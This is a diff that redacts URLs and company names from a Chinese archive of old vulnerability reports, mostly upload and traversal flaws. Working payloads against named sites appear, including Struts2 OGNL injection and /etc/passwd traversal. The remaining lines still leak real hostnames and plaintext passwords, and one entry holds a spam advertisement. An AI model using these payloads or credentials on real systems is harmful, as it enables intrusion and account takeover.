 **POC**: #3.以下枚举五例作为通用，【注意：例举的漏洞仅供Cncert测试使用，其它人员请勿恶意利用例子和该该方法进行破坏，否则后果自负！】http://www.***.gov.cn//main/model/newsoperation/webEditor/eWebEditor.jsphttp://s***y.***.gov.cn//main/model/newsoperation/webEditor/eWebEditor.jsphttp://www.***w.gov.cn//main/model/newsoperation/webEditor/eWebEditor.jsphttp://www.***.
 
@@ -15986,8 +15986,8 @@
 ---
 
 ---
-### [wooyun-2012-07696] 腾讯某子站任意文件下载
-**厂商**: 腾讯 | **年份**: 2012 | **类型**: 任意文件遍历/下载
+### [wooyun-2012-07696] 某互联网公司某子站任意文件下载
+**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: 任意文件遍历/下载
 
 **元思考**: 触发信号: 功能测试
 
@@ -15998,7 +15998,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 也不多说了：http://tap.3g.qq.com:8080/picview?b=idpic&filename=../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd%00.png
+**详情**: 也不多说了：https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -16020,7 +16020,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 用友crm系统详情请看http://wooyun.org/bugs/wooyun-2015-0137238http://crm.emar.com/<html><form action="http://crm.emar.com/ajax/uploadfile.php?DontCheckLogin=1" method="post" enctype ="multipart/form-data"><input type="file" name="file" /><input type="submit" name="upload" value="upload"/></form></html>应该是做了什么限制、或者有安全狗什么的 php文件一访问就是404..http://crm.emar.com/tmpfile/upd_1VOJBb.txt 我就上传个txt吧、、能上传 但访问不了
+**详情**: 用友crm系统详情请看https://example.com/[已脱敏] action="https://example.com/[已脱敏]" method="post" enctype ="multipart/form-data"><input type="file" name="file" /><input type="submit" name="upload" value="upload"/></form></html>应该是做了什么限制、或者有安全狗什么的 php文件一访问就是404..https://example.com/[已脱敏] 我就上传个txt吧、、能上传 但访问不了
 
 **POC**: (见原文)
 
@@ -16042,7 +16042,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 文件上传地址：http://home.ithaier.com/FCKeditor/editor/filemanager/browser/default/browser.html?Type=all&Connector=connectors/aspx/connector.aspx典型的FCKeditor文件上传漏洞
+**详情**: 文件上传地址：https://example.com/[已脱敏]
 
 **POC**: 发现大量的入侵痕迹，目测已被提权。
 
@@ -16066,7 +16066,7 @@
 
 **详情**: 
 
-**POC**: http://analyst9.htsec.com:1301/test3693/  木马地址http://analyst9.htsec.com/admin/http://analyst9.htsec.com:1301/manager/html/
+**POC**: https://example.com/[已脱敏]  木马地址https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -16075,7 +16075,7 @@
 
 ---
 ### [wooyun-2012-07261] 速成建站通杀漏洞，直接秒杀服务器！
-**厂商**: http://www.esite.net.cn/ | **年份**: 2012 | **类型**: 文件上传导致任意代码执行
+**厂商**: https://example.com/[已脱敏] | **年份**: 2012 | **类型**: 文件上传导致任意代码执行
 
 **元思考**: 触发信号: 功能测试
 
@@ -16088,7 +16088,7 @@
 
 **详情**: 速成建站通杀漏洞，直接秒杀服务器！进去直接mysql最高权限 ！危害这个你懂滴！
 
-**POC**: http://my.5uweb.com/coon.asp服务器咱就不进了！！河蟹啊！
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -16108,7 +16108,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 小蝌蚪聊天室程序是github上开源的程序,看样子还有很多人在用(500多星,200多fork).地址:https://github.com/walkor/workerman-todpole发现漏洞地址:http://kedou.workerman.net/右侧上传头像功能未限制上传文件类型.导致可上传php木马.上传接口还直接返回上传后文件位置.如果,使用此程序的人未使用低级系统账户可导致严重问题.
+**详情**: 小蝌蚪聊天室程序是github上开源的程序,看样子还有很多人在用(500多星,200多fork).地址:https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -16118,8 +16118,8 @@
 ---
 
 ---
-### [wooyun-2011-01218] 腾讯某分站使用存在漏洞的管理系统
-**厂商**: 腾讯 | **年份**: 2011 | **类型**: 文件上传导致任意代码执行
+### [wooyun-2011-01218] 某互联网公司某分站使用存在漏洞的管理系统
+**厂商**: 某互联网公司 | **年份**: 2011 | **类型**: 文件上传导致任意代码执行
 
 **元思考**: 触发信号: 功能测试
 
@@ -16130,9 +16130,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.itravelqq.com/用了存在漏洞的老版本phpcms 可以被利用
+**详情**: https://example.com/[已脱敏] 可以被利用
 
-**POC**: http://www.itravelqq.com/此站被入侵过 内存子站同样有漏洞
+**POC**: https://example.com/[已脱敏] 内存子站同样有漏洞
 
 **绕过**: 直接利用
 
@@ -16152,7 +16152,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://rank.kongzhong.com:80/updateUserName?aid=&redirect:xxxxx%25{%23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23path%3d%23req.getRealPath(%22/%22)%2b'/x.html',%23d%3dnew%20java.io.FileWriter(%23path),%23d.write('test,from,wooyun'),%23d.close()}
+**详情**: https://example.com/[已脱敏]'com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23path%3d%23req.getRealPath(%22/%22)%2b'/x.html',%23d%3dnew%20java.io.FileWriter(%23path),%23d.write('test,from,wooyun'),%23d.close()}
 
 **POC**: (见原文)
 
@@ -16176,7 +16176,7 @@
 
 **详情**: 福建省某市网络办公系统上传漏洞导致大量信息泄漏
 
-**POC**: 在电信某C段发现一个网络办公系统http://59.60.30.115:8080//login.asp对网站进行敏感目录检测。发现这个文件http://59.60.30.115:8080/photo.asp  可未授权进行文件上传本来以为直接上传利用解析漏洞，但是发现网站过滤了；符号用burp suite进行截断上传 ，成功获得webshell获得webshell发现该网站的文件都进行加密对数据库文件进行反编译发现数据库用户信息存在一个XML文件内<?xml version="1.0" encoding="utf-8"?><xml><info><item><Userid>1</Userid><
+**POC**: 在电信某C段发现一个网络办公系统http://[IP已脱敏]  可未授权进行文件上传本来以为直接上传利用解析漏洞，但是发现网站过滤了；符号用burp suite进行截断上传 ，成功获得webshell获得webshell发现该网站的文件都进行加密对数据库文件进行反编译发现数据库用户信息存在一个XML文件内<?xml version="1.0" encoding="utf-8"?><xml><info><item><Userid>1</Userid><
 
 **绕过**: 直接利用
 
@@ -16218,7 +16218,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://kefu.linekong.com/eService/又是一个linux系统
+**详情**: https://example.com/[已脱敏]
 
 **POC**: 如上
 
@@ -16262,7 +16262,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://cas.nwpu.edu.cn/cas/login?service=http%3A%2F%2Fportal.nwpu.edu.cn%2Fdcp%2Findex.jsp
+**详情**: https://example.com/[已脱敏]
 
 **POC**: 0x_1.登陆之后，个人主页存在任意文件上传漏洞0x_2.连一下看看0x_3.看一下系统版本
 
@@ -16284,7 +16284,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://wooyun.org/bugs/wooyun-2010-066857 发掘另外几处漏洞技术支持:北京富基融通科技有限公司(http://www.e-future.com.cn/)程序名称：商业供应链系统漏洞类型：任意文件上传导致代码执行、列目录泄露备份源码、数据库信息一、任意文件上传前人的漏洞是自己本地构造一个html，其实网站同级目录下就有upload.html/web/epublic/upload.html1.http://123.127.107.117/web/epublic/upload.html直接上传jsp小马，位置如下：mask 区域1.http://**.**.**/webhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/x.jsp aa_2.2.http://**.**.**/webhttps://w
+**详情**: https://example.com/[已脱敏] 发掘另外几处漏洞技术支持:北京富基融通科技有限公司(https://example.com/[已脱敏])程序名称：商业供应链系统漏洞类型：任意文件上传导致代码执行、列目录泄露备份源码、数据库信息一、任意文件上传前人的漏洞是自己本地构造一个html，其实网站同级目录下就有upload.html/web/epublic/upload.html1.http://[IP已脱敏] 区域1.http://**.**.**/webhttps://example.com/[已脱敏] aa_2.2.http://**.**.**/webhttps://w
 
 **POC**: (见原文)
 
@@ -16350,9 +16350,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: BOC是杭州博采网络科技股份有限公司的高端网站建设品牌，是知名的杭州网络公司。博采网络成立于2004年。我们致力于为全球精英企业提供创新、尖端、前沿的数字化营销服务。十年来始终坚守"全网价值营销服务商"的服务定位，与全球逾3000家企业建立了长期深入、互惠互信的战略合作关系，其中包括阿里巴巴、松下、吉利、华润、保利、万科、传化等知名企业。官网给出的案例太屌了：http://www.bocweb.cn/上传点：/bocadmin/j/uploadify.phpbocaiadmin是后台位置；有些站点目测管理员已经发行该漏洞修复了，但还是有大部分大部分大部分大部分存在；包括博采官网案例：    杀伤力太强了，Mask隐藏一下；第15个案例是他们官网mask 区域1.http://**.**.**/zhongxin//bocadmin/j/uploadify.php   中信银行      __
+**详情**: BOC是杭州博采网络科技股份有限公司的高端网站建设品牌，是知名的杭州网络公司。博采网络成立于2004年。我们致力于为全球精英企业提供创新、尖端、前沿的数字化营销服务。十年来始终坚守"全网价值营销服务商"的服务定位，与全球逾3000家企业建立了长期深入、互惠互信的战略合作关系，其中包括某电商平台、松下、吉利、华润、保利、万科、传化等知名企业。官网给出的案例太屌了：https://example.com/[已脱敏]    杀伤力太强了，Mask隐藏一下；第15个案例是他们官网mask 区域1.http://**.**.**/zhongxin//bocadmin/j/uploadify.php   中信银行      __
 
-**POC**: 都不敢拿太屌的站点做测试~漏洞是利用最下面的表单，可以看到在fileext添加了上传的类型便可以直接上传任意文件测试2个：有安全狗的你们就自己突破练练技术，但不要搞破坏http://www.jlygb.com/bocadmin/j/uploadify.phphttp://www.jlygb.comhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/php.phphttp://www.t-lift.cn//bocadmin/j/uploadify.phphttp://www.t-lift.cn/https://wooyun-img.oss-
+**POC**: 都不敢拿太屌的站点做测试~漏洞是利用最下面的表单，可以看到在fileext添加了上传的类型便可以直接上传任意文件测试2个：有安全狗的你们就自己突破练练技术，但不要搞破坏https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -16361,7 +16361,7 @@
 
 ---
 ### [wooyun-2014-072612] 全国海关互联网信息系统存在任意文件操作&文件上传&信息泄漏
-**厂商**: 202.127.48.176 | **年份**: 2014 | **类型**: 未授权访问/权限绕过
+**厂商**: [IP已脱敏] | **年份**: 2014 | **类型**: 未授权访问/权限绕过
 
 **元思考**: 触发信号: 功能测试
 
@@ -16394,7 +16394,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://webvote.hangzhou.com.cn/mx/bm.php未做任何过滤直接上传PHP马
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -16438,9 +16438,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 看图吧，不详细说了最后生成的文件http://s13.mogujie.cn/b7/pic/130904/y61xb_kqyxcn2ekfbfqtdwgfjeg5sckzsew_20x20.jpg.php;aa_960x400.php;aa不过经过二次渲染了，需要想办法绕过
+**详情**: 看图吧，不详细说了最后生成的文件https://example.com/[已脱敏]
 
-**POC**: 看图吧，不详细说了最后生成的文件http://s13.mogujie.cn/b7/pic/130904/y61xb_kqyxcn2ekfbfqtdwgfjeg5sckzsew_20x20.jpg.php;aa_960x400.php;aa不过经过二次渲染了，需要想办法绕过
+**POC**: 看图吧，不详细说了最后生成的文件https://example.com/[已脱敏]
 
 **绕过**: 过滤绕过
 
@@ -16460,9 +16460,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 上传页面http://61.178.185.67:85/UpLoadFile.jsp然后就是各种网站沦陷。。http://61.178.185.67:88http://61.178.185.67等等。。。该服务器问题太多。。。补丁打的不多。。。远程端口是9999，但小菜一直连接不上。不知为何。。。
+**详情**: 上传页面http://[IP已脱敏]
 
-**POC**: http://61.178.185.67:85/UserFiles/File/201361046.jsp翻其他盘符可以看到一些前人留下的文件和马。。。。
+**POC**: http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -16484,7 +16484,7 @@
 
 **详情**: 不需要登录manage.可以随意上传文件.其他未测试
 
-**POC**: inurl:/manage/foldercontent.html现在我们本地搞个wooyun.txt 写zrtznb上传  上传就是那个+号http://187-162-112-181.static.axtel.net/manage/shares/Documents/wooyun.txt
+**POC**: inurl:/manage/foldercontent.html现在我们本地搞个wooyun.txt 写zrtznb上传  上传就是那个+号https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -16526,9 +16526,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://tg.tttuangou.net/虽然该站是测试站，但测试站是介绍自己的产品的，宣传自己的产品都有这么大的漏洞，那如何让客户去相信你的产品呢？测试站有这个漏洞，是不是其他用你的产品的网站也有这个漏洞呢？是个致命的漏洞。
+**详情**: https://example.com/[已脱敏]
 
-**POC**: 后台上传图片的位置传上的phpwebshell地址  http://tg.tttuangou.net/uploads/2015-06-01/364c7da23612d6ba91f510f29d9ae6ce.php那么多的数据库文件随便下载一个可执行任意命令
+**POC**: 后台上传图片的位置传上的phpwebshell地址  https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -16548,9 +16548,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://comment2.csdn.net/images/logo.gif/1.php
+**详情**: https://example.com/[已脱敏]
 
-**POC**: http://comment2.csdn.net/images/logo.gif/1.php
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -16570,9 +16570,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 进入http://www.phpnow.org/后缀随便输入，如http://www.phpnow.org/wooyun
+**详情**: 进入https://example.com/[已脱敏]
 
-**POC**: 图片：http://www.phpnow.org/wooyun.png目前，2014年2月8日15:12:51仍可访问http://www.phpnow.org/c.php自己上传了php探针：http://www.phpnow.org/tz.php文档：http://www.phpnow.org/wooyun.html
+**POC**: 图片：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -16594,7 +16594,7 @@
 
 **详情**: gg：inurl:/gmis/xjgl/所有页面权限不经验证。。导致添加删除等操作都可以越权操作。。
 
-**POC**: 这里说说上传吧，http://59.67.75.234/gmis/xjgl/student_info1.aspx?Action=qpqycpki  （存在任意添加学生信息。。bug）照片上传，以学号命名文件，先输入一个1.asp;x  在找一张包含asp木马的图片上传即可，获得的文件名为：1.asp;x.jpg
+**POC**: 这里说说上传吧，http://[IP已脱敏]  （存在任意添加学生信息。。bug）照片上传，以学号命名文件，先输入一个1.asp;x  在找一张包含asp木马的图片上传即可，获得的文件名为：1.asp;x.jpg
 
 **绕过**: 直接利用
 
@@ -16614,7 +16614,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://test.myoppo.com/bluesword/blue_sword.php?t=t_upload&Action=PostMsg
+**详情**: https://example.com/[已脱敏]
 
 **POC**: 成功取得网站权限
 
@@ -16636,7 +16636,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://ac.qfkd.com.cn/431000 123456 随意的找了个 就进去了..饿的叽里咕噜的 哎`. 真蛋疼 怪他`...
+**详情**: https://example.com/[已脱敏] 123456 随意的找了个 就进去了..饿的叽里咕噜的 哎`. 真蛋疼 怪他`...
 
 **POC**: (见原文)
 
@@ -16658,7 +16658,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 无意间，跑到优酷站上，随便鸟了下，发现目录遍历，找到一处 可上传，拿下菜刀一挥，我草 这权限 吓尿了。http://minisite.youku.com/test/thumbhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/
+**详情**: 无意间，跑到优酷站上，随便鸟了下，发现目录遍历，找到一处 可上传，拿下菜刀一挥，我草 这权限 吓尿了。https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -16680,7 +16680,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1.首先注册并登陆该系统（www.cspro.org）。然后进入“我的信息”——“考生个人信息”页面。(具体页面应该是：http://www.cspro.org/lead/leadbpm.do?__action=goto_iframe&path=CCF_KS_BMXX&djtype=TT)在考生简历部分有一个“上传附件”，点开，直接上传一个JSP马。2.之后点击保存。然后重新进入“考生个人信息”页面。点开刚才上传的JSP的链接。——竟然能访问！！！3.之前我做测试的时候，马是很稳定的，一直能访问到。后来可能有所察觉，大概是加了个扫描并删除JSP文件的机制。但是毕竟是传上去了，毕竟已经访问到了。之后，你有大概30秒的时间做你想做的工作。4.翻一翻网站的源文件，就能顺势拿下数据库。这个认证考试，考生是要交费的。虽然一大部分组团的考生有优惠（免费、100元/人），但是个人报名要多少钱呢？三百块！
+**详情**: 1.首先注册并登陆该系统（www.cspro.org）。然后进入“我的信息”——“考生个人信息”页面。(具体页面应该是：https://example.com/[已脱敏])在考生简历部分有一个“上传附件”，点开，直接上传一个JSP马。2.之后点击保存。然后重新进入“考生个人信息”页面。点开刚才上传的JSP的链接。——竟然能访问！！！3.之前我做测试的时候，马是很稳定的，一直能访问到。后来可能有所察觉，大概是加了个扫描并删除JSP文件的机制。但是毕竟是传上去了，毕竟已经访问到了。之后，你有大概30秒的时间做你想做的工作。4.翻一翻网站的源文件，就能顺势拿下数据库。这个认证考试，考生是要交费的。虽然一大部分组团的考生有优惠（免费、100元/人），但是个人报名要多少钱呢？三百块！
 
 **POC**: 没有下载其源代码。想想也知道根本没有对上传进行有效过滤，连基本的后缀名过滤也没有。
 
@@ -16702,9 +16702,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 上海市人民政府侨务办公室电子政务信息系统url:https://admin.qwb.sh.gov.cn其ip为：211.152.36.84，与之前的不同，虽然都是fck问题问题原因fck编辑器不正确配置https://admin.qwb.sh.gov.cn/qwb_inter/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=../以上，文件遍历
+**详情**: 上海市人民政府侨务办公室电子政务信息系统url:https://example.com/[已脱敏]
 
-**POC**: 文件上传https://admin.qwb.sh.gov.cn//qwb_inter/FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=https://admin.qwb.sh.gov.cn//qwb_inter/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector在该上传目录里是没有之前上传过的wooyun.jspx的，这点也可以证明是不同系统一句话地址：https://admin.qwb.sh.go
+**POC**: 文件上传https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -16724,7 +16724,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 主要涉及http://101.231.95.27:8091服务器通过扫描端口发现开放着多个端口，进入后发现分别是不同的税务的后台此处有上传，有设置地址，可以用来钓鱼，上传处有漏洞好多人家都用它的
+**详情**: 主要涉及http://[IP已脱敏]服务器通过扫描端口发现开放着多个端口，进入后发现分别是不同的税务的后台此处有上传，有设置地址，可以用来钓鱼，上传处有漏洞好多人家都用它的
 
 **POC**: 前台通过傻瓜万能密码可进入，没尝试sql注入此处有上传没有敢深入，啥也没干就看了看，勿查水表
 
@@ -16770,7 +16770,7 @@
 
 **详情**: 之前看简历的时候，发现后盾培训的一个学生简历中有项目地址，打开后http://c41_wangpan.houdunphp.com/houduan/filemanager/index.php发现可以任意文件遍历，可以下载，然后可以通过下载的代码发现其它bug，比如可以上传任意文件，然后可以上传自己的代码
 
-**POC**: http://c41_wangpan.houdunphp.com/houduan/filemanager/index.php?d=./../../../../遍历文件http://c41_wangpan.houdunphp.com/houduan/filemanager/index.php?d=./..//tieba发现一个up.php，下载发现无验证上传自己写个表单上传文件，成功，应该是传到了upload目录下，访问刚刚上传的文件http://c41_wangpan.houdunphp.com/houduan/tiebahttps://wooyun-img.oss-cn-beijing.al
+**POC**: http://c41_wangpan.houdunphp.com/houduan/filemanager/index.php?d=./../../../../遍历文件http://c41_wangpan.houdunphp.com/houduan/filemanager/index.php?d=./..//tieba发现一个up.php，下载发现无验证上传自己写个表单上传文件，成功，应该是传到了upload目录下，访问刚刚上传的文件http://c41_wangpan.houdunphp.com/houduan/tiebahttps://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -16790,9 +16790,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://xiste.cn/ 演示站后台http://www.xsite.cn/demo/xsite.php用户名密码默认xSite xsite ，进入后台后，附近管理上传木马，木马文件名可修改成muma.php.txt,上传成功直接可以执行，可以上传任意文件，只要在文件扩展名加上.txt。然后发现根目录是phpcms v9，查看数据库连接字符串，用大马连接，在管理员表中添加phpcms v9 的默认管理员用户名和默认加密后的密码，可登录http://www.xsite.cn/admin.php ,并同时可登录http://www.php.net.cn/admin.php 和http://siteteam.cn/admin.php。
+**详情**: https://example.com/[已脱敏] 演示站后台https://example.com/[已脱敏] xsite ，进入后台后，附近管理上传木马，木马文件名可修改成muma.php.txt,上传成功直接可以执行，可以上传任意文件，只要在文件扩展名加上.txt。然后发现根目录是phpcms v9，查看数据库连接字符串，用大马连接，在管理员表中添加phpcms v9 的默认管理员用户名和默认加密后的密码，可登录https://example.com/[已脱敏] ,并同时可登录https://example.com/[已脱敏] 和https://example.com/[已脱敏]
 
-**POC**: http://www.xsite.cn/demo/attachments/xsite/test.php.txt 附件中上传的。
+**POC**: https://example.com/[已脱敏] 附件中上传的。
 
 **绕过**: 直接利用
 
@@ -16812,9 +16812,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://bbs.chinaz.com/apple/add.txt
+**详情**: https://example.com/[已脱敏]
 
-**POC**: 长期收博彩流量,百度新闻源,骗子勿扰！联系QQ:88060733团队本身就有专业的seo 和日站人员 你那点骗术别来浪费大家的时间！
+**POC**: 长期收博彩流量,某搜索引擎新闻源,骗子勿扰！联系某互联网公司:88060733团队本身就有专业的seo 和日站人员 你那点骗术别来浪费大家的时间！
 
 **绕过**: 直接利用
 
@@ -16834,9 +16834,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: <form action="http://pss.csair.com/enableq/Android/FileUpload.php?optionID=1" method="post" enctype="multipart/form-data" name="form1" id="form1"><input type="hidden" name ="uploadFileName" value="uploadedfile_1" /><input type="file" name="uploadedfile_1" id="fileField" /><input type="submit" name="button" id="button" value="submit" /></form>直接上传php不行。试了一下Test.php:a.jpg //重命名为jpgtest.php. //可以但是重命
+**详情**: <form action="https://example.com/[已脱敏]" method="post" enctype="multipart/form-data" name="form1" id="form1"><input type="hidden" name ="uploadFileName" value="uploadedfile_1" /><input type="file" name="uploadedfile_1" id="fileField" /><input type="submit" name="button" id="button" value="submit" /></form>直接上传php不行。试了一下Test.php:a.jpg //重命名为jpgtest.php. //可以但是重命
 
-**POC**: <form action="http://pss.csair.com/enableq/Android/FileUpload.php?optionID=1" method="post" enctype="multipart/form-data" name="form1" id="form1"><input type="hidden" name ="uploadFileName" value="uploadedfile_1" /><input type="file" name="uploadedfile_1" id="fileField" /><input type="submit" name="
+**POC**: <form action="https://example.com/[已脱敏]" method="post" enctype="multipart/form-data" name="form1" id="form1"><input type="hidden" name ="uploadFileName" value="uploadedfile_1" /><input type="file" name="uploadedfile_1" id="fileField" /><input type="submit" name="
 
 **绕过**: 直接利用
 
@@ -16856,7 +16856,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: #1 信息泄露源由于唱吧主站服务器WEB服务端配置缺陷，以及开发人员代码上线安全意识不足，直接将版本控制软件SVN所残留的信息发布到了线上。WooYun: Changba-inc唱吧svn敏感信息泄露白帽子曾经报告过一个svn信息泄露威胁，但唱吧的修复方案只是简单的针对http://访问源进行了限制，而对https的配置并未生效，导致仍然存在缺陷。https://changba.com/.svn/entries#2 写个自动化工具扫描，并爬行泄露的源码svn_disclosure.py https://changba.com /******************************************* Fetching: https://changba.com* mkdir changba.com* http://www.kulv.com/repos/kulv/KTV/www*
+**详情**: #1 信息泄露源由于唱吧主站服务器WEB服务端配置缺陷，以及开发人员代码上线安全意识不足，直接将版本控制软件SVN所残留的信息发布到了线上。WooYun: Changba-inc唱吧svn敏感信息泄露白帽子曾经报告过一个svn信息泄露威胁，但唱吧的修复方案只是简单的针对http://访问源进行了限制，而对https的配置并未生效，导致仍然存在缺陷。https://example.com/[已脱敏] 写个自动化工具扫描，并爬行泄露的源码svn_disclosure.py https://example.com/[已脱敏] /******************************************* Fetching: https://example.com/[已脱敏] mkdir changba.com* https://example.com/[已脱敏]
 
 **POC**: #5 任意文件上传漏洞利用#6 查看数据库配置信息<?php// =============================// ======  纵切专用库  ===========// =============================/*mysql client 写数据库地址*/$config['ZuitaoKtvServer_client']['servername'] = '192.168.*.***';$config['ZuitaoKtvServer_client']['port'] = 3306;$config['ZuitaoKtvServer_client']['user
 
@@ -16866,8 +16866,8 @@
 ---
 
 ---
-### [wooyun-2011-01344] 新浪分站上传
-**厂商**: 新浪 | **年份**: 2011 | **类型**: 文件上传导致任意代码执行
+### [wooyun-2011-01344] 某社交平台分站上传
+**厂商**: 某社交平台 | **年份**: 2011 | **类型**: 文件上传导致任意代码执行
 
 **元思考**: 触发信号: 功能测试
 
@@ -16880,7 +16880,7 @@
 
 **详情**: 
 
-**POC**: http://games.sina.com.cn/upload.htm
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -16922,7 +16922,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: url:http://59.172.182.106:80/manager/htmluser:adminpass:admin
+**详情**: url:http://[IP已脱敏]
 
 **POC**: (见原文)
 
@@ -16944,7 +16944,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 去官网下一份源码配置试了下，看到网盘试了下上传文件好吧，直接能上传php...下载链接类似于http://xxx/downurl.phpurls=datauploadfile/1/1450631688.php&filename=hhh.php改成http://xxx/data/uploadfile/1/1450631688.php上传一句话简直轻松官网demo测试：http://demo.phpoa.cn/data/uploadfile/2/1450632097.php密码：config
+**详情**: 去官网下一份源码配置试了下，看到网盘试了下上传文件好吧，直接能上传php...下载链接类似于http://xxx/downurl.phpurls=datauploadfile/1/1450631688.php&filename=hhh.php改成http://xxx/data/uploadfile/1/1450631688.php上传一句话简直轻松官网demo测试：https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -16966,9 +16966,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 目标地址：鹿泉市健康档案信息管理系统http://61.182.231.214:8080/AHIS/Login/上传页面地址：http://61.182.231.214:8080/AHIS/PubFrame/UpFile.jsp
+**详情**: 目标地址：鹿泉市健康档案信息管理系统http://[IP已脱敏]
 
-**POC**: 上传后抓包上传路径为：LOCALSOURCE/PhotoGraph/201504221125274.jpgPOC，通过修改fname=jsp，即可达到上传jsp的目的POST http://61.182.231.214:8080/AHIS/PubFrame/UpFile.jsp?ImportUrl=true&fname=jsp&filename=null HTTP/1.1Accept: text/html, application/xhtml+xml, */*Referer: http://61.182.231.214:8080/AHIS/PubFrame/UpFile.jspAccept-L
+**POC**: 上传后抓包上传路径为：LOCALSOURCE/PhotoGraph/201504221125274.jpgPOC，通过修改fname=jsp，即可达到上传jsp的目的POST http://[IP已脱敏] HTTP/1.1Accept: text/html, application/xhtml+xml, */*Referer: http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -16988,7 +16988,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 二级域名扫描可得到oa.dzzoffice.com 默认密码admin admin存在任意文件上传之后通过读取数据库配置得到一个密码:Leyun00018080端口存在wdcp admin Leyun0001dzzoffice.com的8181端口同样存在此问题可以通过创建用户来获取权限在两台服务器中可以翻出如下信息:{s:6:"server";s:18:"smtp.exmail.qq.com";s:4:"port";s:2:"25";s:4:"auth";s:1:"1";s:4:"from";s:10:"zyx@dzz.cc";s:13:"auth_username";s:10:"zyx@dzz.cc";s:13:"auth_password";s:10:"xingli0826";}}密码xingli0826通过对smtp服务器的查看可登陆邮箱⁄(⁄ ⁄•⁄ω⁄•⁄ ⁄)⁄看到的时候小小
+**详情**: 二级域名扫描可得到oa.dzzoffice.com 默认密码admin admin存在任意文件上传之后通过读取数据库配置得到一个密码:Leyun00018080端口存在wdcp admin Leyun0001dzzoffice.com的8181端口同样存在此问题可以通过创建用户来获取权限在两台服务器中可以翻出如下信息:{s:6:"server";s:18:"smtp.exmail.某互联网公司.com";s:4:"port";s:2:"25";s:4:"auth";s:1:"1";s:4:"from";s:10:"zyx@dzz.cc";s:13:"auth_username";s:10:"zyx@dzz.cc";s:13:"auth_password";s:10:"xingli0826";}}密码xingli0826通过对smtp服务器的查看可登陆邮箱⁄(⁄ ⁄•⁄ω⁄•⁄ ⁄)⁄看到的时候小小
 
 **POC**: 由上面的几个邮箱 并通过whois可知DNS在dnspod上so.使用57389a24ccc951c90b74024a32ac81af破解后的密文nabifhxs登陆至此 已经把管理员的菊花爆掉一半
 
@@ -17010,9 +17010,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 中国石油天然气股份有限公司广西石化分公司物资采购供应管理信息系统http://222.83.251.40/logonAction.do问题出在系统使用的编辑器fckeditorhttp://222.83.251.40/fckeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=../../http://222.83.251.40/fckeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=../../WEB-INF/
+**详情**: 中国石油天然气股份有限公司广西石化分公司物资采购供应管理信息系统http://[IP已脱敏]
 
